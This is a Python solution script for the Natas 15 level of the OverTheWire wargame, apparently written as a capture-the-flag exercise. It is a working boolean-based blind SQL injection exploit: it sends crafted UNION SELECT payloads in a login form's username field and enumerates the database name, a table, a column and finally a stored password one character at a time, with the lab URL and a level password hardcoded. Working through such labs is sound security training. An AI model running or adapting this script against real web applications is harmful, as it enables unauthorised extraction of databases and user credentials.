import requests
import sys

def flag(url,username,password,len_alphanum,table,column):
    alpha_num = "012345789abcdefgijklmnopqrstuvwxyzABCDEFGIJKLMNOPQRSTUVWXYZ6hH" 
    flag = ""
    letter = 0
    while letter < len_alphanum:
        post_data = {
            "username":"\" union select 1,2 from " + table + " where " + column + " like binary '"+ flag + alpha_num[letter] + "%'-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        if "This user exists" in sqli_r.text:
            flag = flag + alpha_num[letter]
            letter = 0
        else:
            sys.stdout.write(f"\rExtracting password: {flag}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
    print(f"\rThe flag for natas15 is:  {flag.ljust(20)}")

def cols(url,username,password,alpha_num,len_alphanum,database,table):
    column = ""
    letter = 0
    while letter < len_alphanum:
        post_data = {
            "username":"\" union select 1,2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='" + database + "' and TABLE_NAME='" + table + "' and COLUMN_NAME like binary '" + column + alpha_num[letter] + "%'-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        if "This user exists" in sqli_r.text:
            column = column + alpha_num[letter]
            letter = 0
        else:
            sys.stdout.write(f"\rGetting column: {column}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
    print(f"\rColumn is:  {column.ljust(20)}")
    flag(url,username,password,len_alphanum,table,column)

def tables(url,username,password,alpha_num,len_alphanum,database):
    table = ""
    letter = 0
    while letter < len_alphanum:
        post_data = {
            "username":"\" union select 1,2 FROM information_schema.tables WHERE table_schema = '" + database + "' and table_name like binary '" + table + alpha_num[letter] + "%'-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        if "This user exists" in sqli_r.text:
            table = table + alpha_num[letter]
            letter = 0
        else:
            sys.stdout.write(f"\rGetting table: {table}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
    print(f"\rTable is:  {table.ljust(20)}")
    cols(url,username,password,alpha_num,len_alphanum,database,table)

def database(url,username,password):
    site = requests.get(url,auth=(username,password))
    alpha_num = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" 
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    len_alphanum = len(alpha_num)
    database = ""
    letter = 0
    while letter < len_alphanum:
        post_data = {
            "username":"\" union select 1,2 where database() like binary '" + database + alpha_num[letter] + "%'-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        if "This user exists" in sqli_r.text:
            database = database + alpha_num[letter]
            letter = 0
        else:
            sys.stdout.write(f"\rGetting database: {database}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
    print(f"\rDatabase is:  {database.ljust(20)}")
    tables(url,username,password,alpha_num,len_alphanum,database)

if __name__=="__main__":
    print("Natas 15: SQL Injection time. Patience...")
    url = "http://natas15.natas.labs.overthewire.org/"
    username = "natas15"
    password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
    database(url,username,password)